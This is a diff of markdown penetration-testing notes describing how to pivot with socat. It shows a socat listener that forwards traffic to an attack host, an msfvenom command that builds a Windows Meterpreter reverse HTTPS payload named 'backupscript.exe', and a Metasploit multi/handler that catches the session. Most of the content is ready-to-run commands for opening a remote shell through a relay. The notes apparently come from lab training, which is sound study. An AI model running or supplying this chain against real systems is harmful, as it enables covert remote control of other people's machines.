@@ -1,22 +1,29 @@
 **Overview:**
-[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling. 
-It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. 
+- Socat is a bidirectional relay tool that can create pipe sockets between two independent network channels without SSH tunneling. It acts as a redirector, listening on one host and port and forwarding traffic to another IP and port.
+- In a typical scenario, socat runs on the pivot host, listening for connections from the Windows target and forwarding them transparently to the attack host's Metasploit handler.
+---
+## Socat Redirector
+
+```
+socat TCP4-LISTEN:8080,fork TCP4:<lhost>:80
+```
+
+Start the socat listener on the pivot host. Listens on port `8080` and forwards all traffic to port `80` on the attack host. `fork` allows handling multiple simultaneous connections.
 
 ---
-```
-socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
-```
-starting socat listener
-
-Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server.
+## Payload Generation
 
 ```
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<pivot> LPORT=8080 -f exe -o backupscript.exe
 ```
-generate the payload and transfer it on the target host
+
+Generate a reverse HTTPS payload pointing to the pivot host running socat. 
+
+---
+## Metasploit Handler
 
 ```
-msf6 > use exploit/multi/handler
+use exploit/multi/handler
 ```
-run the payload, it should give back a connection from the ubutu server.
 
+Start the handler on the attack host. Configure `LHOST` and `LPORT` to match the attack host's listener. Upon payload execution on the Windows target, the connection is forwarded through socat and a Meterpreter session opens on the attack host.
